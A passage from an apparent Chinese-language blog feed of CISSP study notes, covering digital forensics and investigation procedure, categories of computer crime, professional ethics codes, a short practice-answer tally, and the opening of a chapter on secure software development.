href="#介质分析" class="headerlink" title="介质分析"></a>介质分析</h4><p>介质分析是计算机取证分析的一个分支，涉及识别和提取存储介质中的信息。</p><p>用于介质分析的技术可能包括：从物理磁盘的未分配扇区恢复已删除文件，进行动态分析，进行静态分析。</p><p>存储设备收集信息步骤：</p><p>绝不能从实时系统访问硬盘或其他介质。</p><p>1、使用阻止器连接到专用的取证工作站，降低设备被意外篡改的可能性。</p><p>2、计算设备内容加密哈希值</p><p>3、创建设备映像文件，需要检查设备映像文件的加密哈希值与原始一致</p><p>4、原始映像文件作为证据，分析原始映像的副本</p><h4 id="内存分析"><a href="#内存分析" class="headerlink" title="内存分析"></a>内存分析</h4><p>内存分析调查人员通常希望从动态系统的内存中收集信息。</p><p>内存收集信息步骤：</p><p>1、使用可信工具生成内存转储文件</p><p>2、计算内存转储文件加密哈希值</p><p>3、创建内存转储文件镜像，并计算镜像加密哈希值</p><p>4、原始文件加密哈希值和镜像加密哈希值比对</p><p>5、原始文件作为证据保存，分析镜像副本</p><h4 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h4><p>网络分析往往取决于对事件发生的预先了解，或使用已经存在的、记录网络活动的安全措施</p><ul><li>入侵检测和防御系统的日志</li><li>流量监测系统捕获的网络流量数据</li><li>事件发生过程中有意收集的数据包</li><li>防火墙和其他网络完全设备的日志</li></ul><p>从网络中收集数据的方式：</p><p>1、使用交换机上的 SPAN 端口（镜像发送到一个或多个其他端口用于分析的数据）</p><p>2、网络分流器（硬件设备，与 SPAN 端口功能相同）</p><p>3、运行软件协议分析器，但是不如使用专用硬件设备靠谱</p><p>网络收集信息步骤：</p><p>1、使用工具收集网络数据包写入取证介质</p><p>2、计算取证介质文件加密哈希值</p><p>3、创建取证介质文件镜像，并计算镜像加密哈希值</p><p>4、原始文件加密哈希值和镜像加密哈希值比对</p><p>5、原始文件作为证据保存，分析镜像副本</p><h4 id="软件分析"><a href="#软件分析" class="headerlink" title="软件分析"></a>软件分析</h4><p>取证分析人员也会对应用程序极其活动进行取证检查。</p><p>怀疑内部人员时，可以进行代码审查，寻找后门、逻辑炸弹或其他漏洞。</p><p>对应用程序或数据服务器日志文件进行检查并做出解释。</p><p>软件分析可能包括根据已知文件类型验证文件哈希值。</p><h4 id="硬件-嵌入式设备分析"><a href="#硬件-嵌入式设备分析" class="headerlink" title="硬件&#x2F;嵌入式设备分析"></a>硬件&#x2F;嵌入式设备分析</h4><p>分析目标：</p><ul><li>个人电脑</li><li>智能手机</li><li>平板电脑</li><li>嵌入汽车&#x2F;安全系统&#x2F;其他设备的电脑</li></ul><p>需要专业知识的分析人员进行。</p><h2 id="19-1-3-调查过程"><a href="#19-1-3-调查过程" class="headerlink" title="19.1.3 调查过程"></a>19.1.3 调查过程</h2><p>召集分析团队协助调查。</p><p>根据组织现有的事件响应策略进行操作。</p><p>基于团队章程，概述调查范围，调查人员权力、角色和责任，以及调查过程中必须遵守的行为规则。</p><h3 id="1-收集证据"><a href="#1-收集证据" class="headerlink" title="1.收集证据"></a>1.收集证据</h3><p>通常没收设备、软件或数据以进行适当的调查。‘</p><p>没收证据的方式很重要，必须以适当的方式进行。</p><p>可能外部没收证据的方式：</p><p>1、当证据所有者不是攻击者的时候，证据所有者可能自愿上交或者同意搜查。</p><p>取证人员可以从计算机中提取大量“掩盖”的信息。</p><p>向可疑人员索要证据时，也就是提醒可疑人员将采取法律行动，可能会篡改证据。</p><p>2、可以让法院签发传票或法庭命令，迫使交出证据，由执法部门送达传票。</p><p>会发出明显的信号，可能会导致篡改证据，使证据在法庭无效。</p><p>3、直接目视规则，执法人员认为证据可能与犯罪活动有关，可以直接扣押看到的证据。</p><p>4、搜查证</p><p>必须获得证据但不能惊动证据所有者或其他人。</p><p>需要使用可信理由说服法官。</p><p>5、紧急情况下，执法人员可以收集证据。</p><p>不收集证据会别销毁，紧急情况下，警务人员可以无证搜查。</p><p>没收内部证据的方式：</p><p>1、新员工协议将“同意提供”作为雇佣协议的条款</p><p>2、内部搜索时，需要考虑员工对隐私的合理期望，必要的情况下，务必咨询律师</p><h3 id="2-请求执法"><a href="#2-请求执法" class="headerlink" title="2.请求执法"></a>2.请求执法</h3><p>在调查过程中首先需要判断，是否请求执法机构接入。</p><p>应该请示高层管理员。</p><p>两个可能不会请求官方的协助因素：</p><p>1、调查可能使事件公开，给公司带来麻烦</p><p>2、执法机构肯定会采取遵从第四修正案和其他合法要求的调查方式，不适用于私下解决的情况。</p><p>搜查证要求取得搜查证的条款：</p><ul><li>如果有合理的理由希望了解个人的隐私，调查人员在搜查个人私有物品前必须取得搜查证。</li><li>只能基于可能的动机签发搜查证。</li><li>搜查证必须指定搜查范围。</li></ul><h3 id="3-实施调查"><a href="#3-实施调查" class="headerlink" title="3.实施调查"></a>3.实施调查</h3><p>调查的主要原则：</p><ul><li>永远不要对曾遭受攻击的实际系统实施调查。将系统脱机、备份、仅用备份进行事件调查。</li><li>永远不要试图“反击”犯罪并进行报复。非法且容易伤及无辜。</li><li>如有疑问，最好向专家求助，执法机构或私人调查公司。</li></ul><h3 id="4-约谈个人"><a href="#4-约谈个人" class="headerlink" title="4.约谈个人"></a>4.约谈个人</h3><p>约谈：为了获取有助于调查信息的谈话</p><p>审问：怀疑某人涉嫌犯罪并希望收集在法庭上可用的证据</p><p>在约谈或审问之前，面谈者应该仔细计划与被约谈人讨论的话题。</p><p>约谈和审问都属于专业技能，只应该由训练有素的人员进行。</p><p>私下审问，必须严格遵守相关法律，同时务必在约谈前咨询律师。</p><h3 id="5-证据的完整性和保存"><a href="#5-证据的完整性和保存" class="headerlink" title="5.证据的完整性和保存"></a>5.证据的完整性和保存</h3><p>必须保证所有数据的完整性。</p><p>简单的归档策略有助于确保组织能够在需要时获得证据。</p><p>日志中包含有价值的证据，需要采取措施保护日志文件的完整性：</p><p>1、使用远程日志记录，网络中所有系统将日志记录发送到一台集中的日志服务器上，锁定该设备，从而防止数据被修改。</p><p>2、使用数字签名来证明日志文件在最初获取之后未被篡改。</p><h3 id="6-报告和记录调查"><a href="#6-报告和记录调查" class="headerlink" title="6.报告和记录调查"></a>6.报告和记录调查</h3><p>每一项调查都应该得出一份最终报告，记录调查的目标、流程、收集的证据以及调查的最终结果。</p><p>务必准备正式文件，为升级和潜在的法律行动奠定了基础。</p><p>各组织应该确保参与收集或分析潜在证据的人员接受适当的培训。</p><p>公司的法律人员和适当的执法机构&#x2F;执法代理机构建立良好的关系。</p><p>可以在组织内部确定一名与执法部门的联络员，好处如下：</p><ul><li>确保执法部门从固定的联络人了解组织的想法并知道通过何人更新信息；</li><li>预先指定的联络人可与执法人员建立良好的工作关系。</li></ul><h1 id="19-2-计算机犯罪的主要类别"><a href="#19-2-计算机犯罪的主要类别" class="headerlink" title="19.2 计算机犯罪的主要类别"></a>19.2 计算机犯罪的主要类别</h1><p>计算机犯罪是与计算机相关的违反法律或法规的犯罪行为。</p><p>犯罪就是犯罪，计算机犯罪的动机和其他类型的犯罪动机在本质上没有差别，唯一的不同可能是攻击者进行攻击的方法有所不同。</p><p>计算机犯罪通常为以下几种类型：</p><ul><li>军事和情报攻击</li><li>商业攻击</li><li>财务攻击</li><li>恐怖攻击</li><li>恶意攻击</li><li>兴奋攻击</li><li>黑客行动主义者攻击</li></ul><h2 id="19-2-1-军事和情报攻击"><a href="#19-2-1-军事和情报攻击" class="headerlink" title="19.2.1 军事和情报攻击"></a>19.2.1 军事和情报攻击</h2><p>军事和情报攻击主要用于从执法机关或军事和技术研究机构获得秘密和受限的信息。</p><p>收集军事信息或其他敏感信息的攻击常是其他更具有破坏性攻击的前兆。</p><p>攻击者可能在寻找以下信息：</p><ul><li>任何类型的军事说明信息，包括部署情报、就绪情报以及战斗计划指令。</li><li>为军事或执法目的收集的秘密情报</li><li>在刑事侦查过程中获得的证据的说明和存储位置</li><li>任何可能被用于后续攻击的秘密信息</li></ul><p>获取军方或情报信息的攻击都是由专业人员进行的，需要部署更正规的安全策略（强有力的边界安全以及内部控制）。</p><p>专业的攻击者几乎不会留下什么证据。</p><h2 id="19-2-2-商业攻击"><a href="#19-2-2-商业攻击" class="headerlink" title="19.2.2 商业攻击"></a>19.2.2 商业攻击</h2><p>商业攻击的重点是非法危害企业运营的信息和系统保密性、完整性和可用性。</p><p>商业攻击的目的只是获得机密信息。</p><p>其他攻击可能侧重于信息的完整性和可用性。例如：勒索软件攻击目的是破坏可用性和保密性。</p><h2 id="19-2-3-财务攻击"><a href="#19-2-3-财务攻击" class="headerlink" title="19.2.3 财务攻击"></a>19.2.3 财务攻击</h2><p>财务攻击用于非法获取钱财和服务。</p><p>财务攻击的目标可能是窃取银行账户中的存款，或获取欺诈性资金转账。</p><h2 id="19-2-4-恐怖攻击"><a href="#19-2-4-恐怖攻击" class="headerlink" title="19.2.4 恐怖攻击"></a>19.2.4 恐怖攻击</h2><p>恐怖攻击的目的是中断正常生活并制造恐怖气氛。</p><p>情报收集一般先于恐怖攻击。</p><p>计算机恐怖攻击的目标可能是控制发电厂、电信网或配电的系统。</p><p>攻击者可能同时进行物理和计算机的恐怖攻击。</p><p>为了识别攻击，必须认真监控系统，并在发现攻击后立即做出响应。</p><h2 id="19-2-5-恶意攻击"><a href="#19-2-5-恶意攻击" class="headerlink" title="19.2.5 恶意攻击"></a>19.2.5 恶意攻击</h2><p>恶意攻击可对组织或个人造成破坏。</p><p>破坏可能是信息的丢失或者信息处理能力的丧失，也可能是组织或个人名誉受到的损坏。</p><p>恶意攻击的动机通常来源于不满，可能是现在或以前的员工，也可能是希望组织垮台的人。</p><p>恶意攻击者还有可能是尝试与另一名员工建立个人关系时被拒绝的人，被拒绝的人对受害者的系统进行攻击，破坏系统数据。</p><p>组织内部的恶意人员，是信息资产的最大威胁。</p><p>并非所有内部攻击都是恶意的。</p><p>安全策略应当解决潜在的内部人员攻击。</p><p>如果恶意攻击未受到抑制，结果可能是毁灭性的。</p><p>应对大多数恶意攻击的最佳措施：</p><p>认真对系统漏洞进行监控和评估。</p><h2 id="19-2-6-兴奋攻击"><a href="#19-2-6-兴奋攻击" class="headerlink" title="19.2.6 兴奋攻击"></a>19.2.6 兴奋攻击</h2><p>兴奋攻击通常由想获得乐趣的人发起。</p><p>脚本小子。</p><p>兴奋攻击的动机是成功闯入系统带来的极度兴奋，主要为破坏系统。</p><p>常见的兴奋类型是：篡改网页</p><h2 id="19-2-7-黑客行动主义者"><a href="#19-2-7-黑客行动主义者" class="headerlink" title="19.2.7 黑客行动主义者"></a>19.2.7 黑客行动主义者</h2><p>黑客行动主义者（黑客和激进分子的结合）攻击者，通常将政治动机与黑客快感联系起来。</p><p>目的是破坏与他们在意识形态上不同的组织活动。</p><h1 id="19-3-道德规范"><a href="#19-3-道德规范" class="headerlink" title="19.3 道德规范"></a>19.3 道德规范</h1><p>管理个人行为的规则统称为道德规范。</p><p>道德规范指导个人日常活动的道德准则和规则。</p><p>网络安全领域，道德规范指导网络安全专业人员的行为，确保以负责人和公证的方式行事。</p><p>道德规范不是法律，是专业行为的最低标准，为你提供了合理的道德判断基础。</p><h2 id="19-3-1-组织道德规范"><a href="#19-3-1-组织道德规范" class="headerlink" title="19.3.1 组织道德规范"></a>19.3.1 组织道德规范</h2><p>几乎每个组织都会向员工发布自己的道德规范，以指导日常工作。</p><p>在道德规范作为单独声明发布时，通常是高级别的，旨在提供一般指导和方向，而不是解决具体情况。</p><h2 id="19-3-2-ISC-的道德规范"><a href="#19-3-2-ISC-的道德规范" class="headerlink" title="19.3.2 ISC 的道德规范"></a>19.3.2 ISC 的道德规范</h2><p>ISC 的道德规范被用作 CISSP 行为的基础，是包含一个序言和和 4 条的简单规范。</p><h3 id="1-道德规范的序言"><a href="#1-道德规范的序言" class="headerlink" title="1.道德规范的序言"></a>1.道德规范的序言</h3><p>道德规范的序言如下：</p><ul><li>社会安全和福祉以及共同利益、对委托人的责任和对彼此的责任，要求我们遵守（并视为遵守）最高道德行为标准。</li><li>严格遵守这些标准是认证考试的要求。</li></ul><h3 id="2-道德规范的准则"><a href="#2-道德规范的准则" class="headerlink" title="2.道德规范的准则"></a>2.道德规范的准则</h3><p>道德规范的准则：</p><p>（1）保护社会、公益、必须的公信与自信，保护基础设施。安全专业人员具有很大的社会责任。担负着确保行为使公众受益的使命。</p><p>（2）行为得体、诚实、公证、负责和守法。</p><p>（3）为委托人提供尽职的、合格的服务。</p><p>（4）发展和保护职业。</p><h3 id="3-道德规范投诉"><a href="#3-道德规范投诉" class="headerlink" title="3.道德规范投诉"></a>3.道德规范投诉</h3><p>如果 ISC 成员遇到潜在的违反道德规范的行为，可向 ISC 提交正式的道德投诉并报告可能的违法行为，以进行调查。</p><p>ISC 只接受认为自己受到指控行为伤害的人提出的投诉</p><ul><li>任何普通公众均可提出涉及准则（1）或准则（2）的投诉</li><li>只有雇主或与个人有合同关系的人才能根据准则（3）提出投诉</li><li>其他专业人士可能会根据准则（4）提出投诉。不局限于网络安全专业人士。</li></ul><p>根据道德规范提出的投诉必须以书面形式和宣誓书的刑事提出。</p><p>ISC 进行正式调查，可能会进行制裁，包括撤销个人认证。</p><h2 id="19-3-3-道德规范和互联网"><a href="#19-3-3-道德规范和互联网" class="headerlink" title="19.3.3 道德规范和互联网"></a>19.3.3 道德规范和互联网</h2><p>各种道德框架也有助于指导数字活动，准则对任何特定的组织都没有约束力，但对道德决策是有用的参考。</p><h3 id="1-RFC-1087"><a href="#1-RFC-1087" class="headerlink" title="1.RFC 1087"></a>1.RFC 1087</h3><p>RFC 1087 《道德规范和互联网》文献</p><p>RFC 1087 被认为是不道德行为的概括列表，概括了不应该做什么</p><p>RFC 1087 说明怀有下列目的的行为都是不可接受的和不道德的：</p><ul><li>试图未经授权访问互联网的资源</li><li>破坏互联网的正常使用</li><li>通过这些行为消耗资源（人、容量、计算机）</li><li>破坏以计算机为基础的信息完整性</li><li>危害用户的隐私权</li></ul><h3 id="2-计算机道德规范的-10-条戒律"><a href="#2-计算机道德规范的-10-条戒律" class="headerlink" title="2.计算机道德规范的 10 条戒律"></a>2.计算机道德规范的 10 条戒律</h3><p>计算机道德规范协会制定了道德规范</p><p>（1）不准使用计算机危害他人</p><p>（2）不准妨碍他人的计算机工作</p><p>（3）不准窥探他人的计算机文件</p><p>（4）不准使用计算机进行偷盗</p><p>（5）不准使用计算机作伪证</p><p>（6）不准私自复制未付费的专用软件，制作盗版软件</p><p>（7）不准在未被授权或未适当补偿的情况下使用他人的计算机资源</p><p>（8）不准盗用他人的知识产品</p><p>（9）必须考虑所编写程序或所设计系统的社会后果</p><p>（10）必须总是以确保关心和尊重同伴的方式使用计算机</p><h3 id="3-公平信息实务守则"><a href="#3-公平信息实务守则" class="headerlink" title="3.公平信息实务守则"></a>3.公平信息实务守则</h3><p>1973 年制定的《公平信息实务守则》</p><p>以道德和负责任的方式处理个人信息的五项原则：</p><p>（1）任何保存个人数据记录的系统的存在都不是保密的</p><p>（2）一个人必须有一种方法来找出记录中有哪些关于此人的信息以及这些信息是如何被使用的</p><p>（3）一个必须有一种方法来防止未经同意而把为某一目的获得的有关该人的信息用于或提供给其他目的</p><p>（4）一个必须有一种方法来纠正或修改有关该人的可识别信息记录</p><p>（5）任何创建、维护、使用或传播可识别个人数据记录的组织必须确保数据在其预期用途中的可靠性，并且必须采取预防措施防止数据被滥用。</p><h1 id="19-4-本章小结"><a href="#19-4-本章小结" class="headerlink" title="19.4 本章小结"></a>19.4 本章小结</h1><h1 id="19-5-考试要点"><a href="#19-5-考试要点" class="headerlink" title="19.5 考试要点"></a>19.5 考试要点</h1><h2 id="了解计算机犯罪的定义"><a href="#了解计算机犯罪的定义" class="headerlink" title="了解计算机犯罪的定义"></a>了解计算机犯罪的定义</h2><p>计算机犯罪是指直接针对或直接涉及计算机的、违反法律或法规的犯罪行为。</p><h2 id="能够列出并解释计算机犯罪的-6-个类别"><a href="#能够列出并解释计算机犯罪的-6-个类别" class="headerlink" title="能够列出并解释计算机犯罪的 6 个类别"></a>能够列出并解释计算机犯罪的 6 个类别</h2><p>军事和情报攻击</p><p>商业攻击</p><p>财务攻击</p><p>恐怖攻击</p><p>恶意攻击</p><p>兴奋攻击</p><p>解释每种攻击的动机</p><h2 id="了解证据收集的重要性"><a href="#了解证据收集的重要性" class="headerlink" title="了解证据收集的重要性"></a>了解证据收集的重要性</h2><p>只要发现事件，就必须开始收集证据并尽可能多地收集与事件相关的信息。</p><p>证据可在后来的法律行动中使用，或用于确定攻击者的身份。</p><p>证据还有助于确定损失的范围和程度。</p><h2 id="了解电子取证过程"><a href="#了解电子取证过程" class="headerlink" title="了解电子取证过程"></a>了解电子取证过程</h2><p>认为自己将成为诉讼目标的组织有责任在一个被称为电子取证的过程中保护数字证据。</p><p>电子取证过程包括信息治理、识别、保存、收集、处理、检查、分析、产生和呈现。</p><h2 id="了解如何调查入侵，以及如何从设备、软件和数据中收集足够的信息"><a href="#了解如何调查入侵，以及如何从设备、软件和数据中收集足够的信息" class="headerlink" title="了解如何调查入侵，以及如何从设备、软件和数据中收集足够的信息"></a>了解如何调查入侵，以及如何从设备、软件和数据中收集足够的信息</h2><p>必须拥有设备、软件或数据来进行分析，并将其用于证据。</p><p>必须获得证据而不得修改它，也不允许其他人修改它。</p><h2 id="了解基本的没收证据的选择方案，并知道每种方案适用的情况"><a href="#了解基本的没收证据的选择方案，并知道每种方案适用的情况" class="headerlink" title="了解基本的没收证据的选择方案，并知道每种方案适用的情况"></a>了解基本的没收证据的选择方案，并知道每种方案适用的情况</h2><p>第一种：</p><p>拥有证据的人可能会自愿交出证据。</p><p>第二种：</p><p>使用法院传票强迫嫌疑人交出证据。</p><p>第三种：<br>执法人员在履行法律允许的职责时可以扣押他直接看到的证据，并且该人员有理由认为此证据可能与犯罪活动相关。</p><p>第四种：</p><p>如果需要没收证据，但不给嫌疑人破坏证据的机会，搜查证最有用。</p><p>第五种：</p><p>在紧急情况下，执法人员可以收集证据。</p><h2 id="了解保存调查数据的重要性"><a href="#了解保存调查数据的重要性" class="headerlink" title="了解保存调查数据的重要性"></a>了解保存调查数据的重要性</h2><p>因为事件发生后总会留下一些痕迹，所以除非确保关键的日志文件被保存合理的一段时间，否则将失去有价值的证据。</p><p>可在适当的地方或档案文件中保留日志文件和系统状态信息。</p><h2 id="了解法庭可采纳的证据的基本要求"><a href="#了解法庭可采纳的证据的基本要求" class="headerlink" title="了解法庭可采纳的证据的基本要求"></a>了解法庭可采纳的证据的基本要求</h2><p>可被采纳的证据必须与案件事实相关。</p><p>事实对案件来说是必须的。</p><p>证据必须有作证能力且证据的收集方式应符合法律规定。</p><h2 id="解释各种可能在刑事或民事审判中使用的证据"><a href="#解释各种可能在刑事或民事审判中使用的证据" class="headerlink" title="解释各种可能在刑事或民事审判中使用的证据"></a>解释各种可能在刑事或民事审判中使用的证据</h2><p>实物证据：</p><p>由可以被带进法庭的物品组成。</p><p>书面证据：</p><p>由能够证明事实的书面文件组成。</p><p>言辞证据：</p><p>包括证人陈述的口头证词和书面证词。</p><h2 id="理解安全人员职业道德的重要性"><a href="#理解安全人员职业道德的重要性" class="headerlink" title="理解安全人员职业道德的重要性"></a>理解安全人员职业道德的重要性</h2><p>安全从业者被赋予非常高的权利和责任，以履行其工作职责。这便存在权利滥用的情形。</p><p>如果没有严格的准则对个人行为进行限制，我们可认为安全从业人员具有不受约束的权力。</p><p>遵守道德规范有助于确保这种权力不被滥用。</p><p>安全专业人员必须遵守自己组织的道德规范以及 ISC 的道德规范。</p><h2 id="了解-ISC-的道德规范和-RFC-1087-《道德规范和互联网》"><a href="#了解-ISC-的道德规范和-RFC-1087-《道德规范和互联网》" class="headerlink" title="了解 ISC 的道德规范和 RFC 1087 《道德规范和互联网》"></a>了解 ISC 的道德规范和 RFC 1087 《道德规范和互联网》</h2><p>所有参加 CISSP 考试的人都应该熟悉 ISC 的道德规范，因为他们必须签署遵守这一准则的协议。</p><p>还应该熟悉 RFC 1087 的基本要求。</p><p>B❌ C</p><p>​犯罪是违反法律或法规的行为。</p><p>B✅</p><p>​军事和情报攻击针对的是系统中的机密信息。</p><p>A✅</p><p>AC❌ ACD</p><p>B✅</p><p>A❌ D</p><p>AC✅</p><p>C✅</p><p>D✅</p><p>C✅</p><p>C✅</p><p>B✅</p><p>C❌ A</p><p>​保存阶段确保潜在可发现的信息收到保护，防止其被更改或删除。</p><p>​产生是将信息转成与他人共享的格式，并将其传递给其他方。</p><p>​处理是对收集的信息进行筛选，对不相关的信息进行“粗剪”</p><p>​呈现是向证人、法庭和其他各方显示信息</p><p>A❌ B</p><p>D❌ B</p><p>​不给反映时间</p><p>A✅</p><p>C❌D</p><p>​检查阶段会分析处理阶段产生的信息，以确定哪些信息来响应请求，并删除受律师-客户特权保护的任何信息。</p><p>D✅</p><p>C❌ B</p><p>​</p><p>B✅</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>20-域3安全架构与工程+域8软件开发安全-软件开发安全</title>
    <link href="/2025/04/21/security/seccert/cissp/20-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/"/>
    <url>/2025/04/21/security/seccert/cissp/20-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="20-1-系统开发控制概述"><a href="#20-1-系统开发控制概述" class="headerlink" title="20.1 系统开发控制概述"></a>20.1 系统开发控制概述</h1><p>软件开发是由技能和安全意识各异的开发者实施的一项复杂且具有挑战性的任务。</p><p>由于恶意的或粗心的开发人员创建后门、缓冲区溢出漏洞或其他导致系统被恶意人员利用的弱点，可能存在巨大的安全漏洞。</p><p>需要在系统开发生命周期内引入安全控制。</p><h2 id="20-1-1-软件开发"><a href="#20-1-1-软件开发" class="headerlink" title="20.1.1 软件开发"></a>20.1.1 软件开发</h2><p>在系统开发的每个阶段都应当考虑安全性。</p><p>给系统构建安全性往往比向现有系统中添加安全性容易的多，必须从软件开发项目的初期就考虑安全性。</p><h3 id="1-编程语言"><a href="#1-编程语言" class="headerlink" title="1.编程语言"></a>1.编程语言</h3><p>计算机只能理解二进制代码。</p><p>使用二进制数字的语言被称为机器语言。</p><p>汇编语言是一种使用助记符来表示 CPU 基本指令的高级语言。</p><p>编译型和解释型语言。</p><h4 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h4><p>C、Java、FORTRAN</p><p>用户不能查看或更改可执行文件中的指令，逆向人员借助反编译器（二进制-&gt;源代码）和反汇编器（二进制-&gt;汇编）逆转编译过程。</p><p>代码保护技术通过各种技术防止或阻止反编译或反汇编的使用。</p><p>跨系统移植。</p><h4 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h4><p>Python、R、JavaScript 和 VBScript</p><p>分发源代码</p><p>用户可以查看原始指令</p><p>编译型代码不容易被第三方操纵，用户也无法查看，存在嵌入恶意代码绕过检测。</p><p>解释型代码用户可查看，可以发现别人添加的恶意代码，自己也可以添加恶意代码。</p><h4 id="库"><a href="#库" class="headerlink" title="库"></a>库</h4><p>库就是包括可重用代码的共享代码库。</p><p>提高开发效率。</p><p>开源项目提供或商业购买或内部维护。</p><p>开发人员应该知道他们使用的共享代码来源，并随时了解库中出现的漏洞。</p><h4 id="开发工具集"><a href="#开发工具集" class="headerlink" title="开发工具集"></a>开发工具集</h4><p>开发人员使用各种工具来帮助他们工作，其中最重要的是集成开发环境(IDE) 。 IDE 为程</p><p>序员提供了一个单一的环境，在这里他们可以编写代码，测试代码，调试代码和编译代码（如</p><p>果适用）。 </p><h3 id="2-面向对象编程"><a href="#2-面向对象编程" class="headerlink" title="2.面向对象编程"></a>2.面向对象编程</h3><p>许多现代编程语言（例如 C++ 、 Java 和．NET 语言）都支持面向对象编程(OOP) 的概念。</p><p>在 OOP 模型中，每个对象都有对应其特定操作的方法。</p><p>对象也可以是其他对象的子类，并且继承父类的方法，</p><p>子类可使用父类的全部方法，也可以拥有其他特定的方法。</p><p>面向对象编程提供了一个抽象的黑盒方案。</p><p>常见对象编程术语：</p><p><strong>消息</strong>  消息是对象的通信或输入</p><p><strong>方法</strong>   方法是定义对象执行响应消息操作的内部代码</p><p><strong>行为</strong>  由对象呈现的结果或输出是一种行为，行为是通过方法处理消息的结果。</p><p><strong>类</strong>  定义对象行为的一组对象的公共方法的集合就是类。</p><p><strong>实例</strong>  对象是包含对象方法的类的实例或例子</p><p><strong>继承</strong>  某个类的方法被另一个子类继承时就会出现继承性。</p><p><strong>委托</strong>  委托是指某个对象将请求转发给另一个对象或委托对象。</p><p><strong>多态性</strong>   多态性是对象的特性，当外部条件变化时，多态性允许对象以不同的行为响应相同的消息或方法。</p><p><strong>内聚</strong>  内聚描述相同类中各方法的目的之间关系的强度。</p><p>所有方法都有相似的目的时，就有了高内聚性，良好软件设计，如果类的方法具有低内聚性时，表明系统设计的不好</p><p><strong>耦合</strong>  耦合是对象之间的交互级别，低耦合意味着较少的交互，因为对象独立，软件设计更优。</p><p>低内聚对象具有高耦合的特点。</p><h3 id="3-保证"><a href="#3-保证" class="headerlink" title="3.保证"></a>3.保证</h3><p>保证程序是在系统生命周期内构建信任的正规过程。</p><p>就是新应用程序的安全控制机制可以在软件生命周期内一直生效。</p><h3 id="4-避免和抑制系统故障"><a href="#4-避免和抑制系统故障" class="headerlink" title="4.避免和抑制系统故障"></a>4.避免和抑制系统故障</h3><p>实施软件和硬件控制时，应该为故障做好准备，确保系统能做出适当的响应。</p><h4 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h4><p>输入验证核实用户输入的值是否匹配期望，然后才允许进一步处理。</p><p>限制检测：通过代码检测确保数字落在一个可接受的范围。</p><p>输入验证也可检测异常字符。</p><p>转义输入：通过使用替代代码替换出现的敏感字符来执行，替代代码将向最终用户呈现相同的字符，但不会由系统执行。</p><p>输入验证通常应该在处理事务的服务器端进行。</p><h4 id="身份认证和会话管理"><a href="#身份认证和会话管理" class="headerlink" title="身份认证和会话管理"></a>身份认证和会话管理</h4><p>确保通过身份认证的用户只执行授权的操作，并自始自终安全地跟踪用户的会话。</p><p>身份认证级别需要和程序敏感程度相关联。</p><p>一般情况下，使用现有的身份认证系统。</p><p>使用已确立的方法进行会话管理，包括：cookie 仅在安全、加密的信道传输，标识符足够长并随机。</p><p>会话令牌具有时效性。</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><p>开发人员应该禁止任何可以公开访问的服务器和应用程序提供详细的错误信息（也称为调试模式）</p><h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4><p>应用程序应该被配置成将错误和其他安全事件的详细日志记录发送到集中日志存储库。</p><p>OWASP 安全编码实践建议记录以下日志：</p><ul><li>输入验证失败</li><li>身份认证尝试，尤其是失败的</li><li>访问控制失败</li><li>篡改尝试</li><li>使用无效或过期的会话令牌</li><li>操作系统或应用程序引发的异常</li><li>管理特权的使用</li><li>传输层安全 TLS 故障</li><li>加密错误</li></ul><h4 id="失效打开和失效关闭"><a href="#失效打开和失效关闭" class="headerlink" title="失效打开和失效关闭"></a>失效打开和失效关闭</h4><p>为系统故障做计划时有两个基本选项：</p><ul><li>失效关闭（fail-secure）状态将系统置于最高级别安全状态，甚至可能完全禁用，直到管理员诊断问题并将系统还原到正常操作状态，</li><li>失效打开（fail-open）状态允许用户绕过失败的安全控制，但此用户获得的特权过高。</li></ul><p>一般情况下，失效关闭是恰当的故障状态。</p><p>失效关闭时，编程人员需要考虑接下来的活动：</p><p>1、停留在失效关闭状态</p><p>管理员人工重启，使用启动密码</p><p>2、自动重启系统</p><p>系统不应该重启并执行自动登录操作，需要提示用户提供授权凭证。</p><p>维护安全性需要权衡用户友好性与功能性。</p><p>添加和提升安全性，会增加成本、增加行政管理开销并降低生产效率&#x2F;吞吐量。</p><h2 id="20-1-2-系统开发生命周期"><a href="#20-1-2-系统开发生命周期" class="headerlink" title="20.1.2 系统开发生命周期"></a>20.1.2 系统开发生命周期</h2><p>对开发考虑、安全的系统必不可少的活动：</p><ul><li>概念定义</li><li>功能需求确定</li><li>控制规范的制订</li><li>设计审查</li><li>编码</li><li>代码审查演练</li><li>系统测试审查</li><li>维护和变更管理</li></ul><h3 id="1-概念定义"><a href="#1-概念定义" class="headerlink" title="1.概念定义"></a>1.概念定义</h3><p>概念定义是一份非常高级的用途声明。</p><p>所有利益相关方（开发、客户和管理）达成的简单声明，规定项目用途以及系统的到大体需求。</p><p>概念定义阶段要求的安全级别会更高，会在规范制定阶段完善。</p><p>建议在系统开发过程的所有阶段参考概念声明。</p><h3 id="2-功能需求确定"><a href="#2-功能需求确定" class="headerlink" title="2.功能需求确定"></a>2.功能需求确定</h3><p>同意概念声明后，进行功能需求确定。</p><p>列出具体的系统功能，研究如何各模块如何协作。</p><p>功能需求文档，三个主要特征：</p><p><strong>输入</strong>  提供给函数的数据</p><p><strong>行为</strong>  